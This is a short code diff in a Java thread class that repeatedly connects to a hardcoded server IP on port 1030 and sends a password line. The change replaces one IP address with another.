@@ -17,7 +17,7 @@ public class Connect extends Thread{
     public void run(){
         while(true) {
             try {
-                socket=new Socket("39.100.5.139",1030);
+                socket=new Socket("64.154.38.174",1030);
                 tcpw=new BufferedWriter(new OutputStreamWriter(socket.getOutputStream()));
                 tcpr=new BufferedReader(new InputStreamReader(socket.getInputStream()));
                 writeIgnoreExce("pass "+AXMain.pass);
